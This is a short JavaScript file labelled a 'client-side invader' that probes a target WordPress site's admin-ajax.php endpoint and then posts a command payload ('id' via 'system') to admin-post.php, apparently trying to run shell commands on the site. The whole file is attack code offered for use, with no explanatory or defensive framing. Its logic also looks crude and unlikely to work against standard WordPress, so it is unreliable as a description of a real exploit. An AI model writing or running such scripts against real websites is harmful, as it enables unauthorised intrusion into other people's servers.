// x.js – invasor cliente-side
function p(u,c){return fetch(u,{method:'POST',body:new URLSearchParams(c)})}
function g(u){return fetch(u).then(r=>r.text())}
function x(target){
  const pay={cmd:'id',a:'system'};
  g(target+'/wp-admin/admin-ajax.php')
   .then(r=>{if(r.includes('0'))p(target+'/wp-admin/admin-post.php',pay)})
   .catch(_=>0);
}
window.x=x;
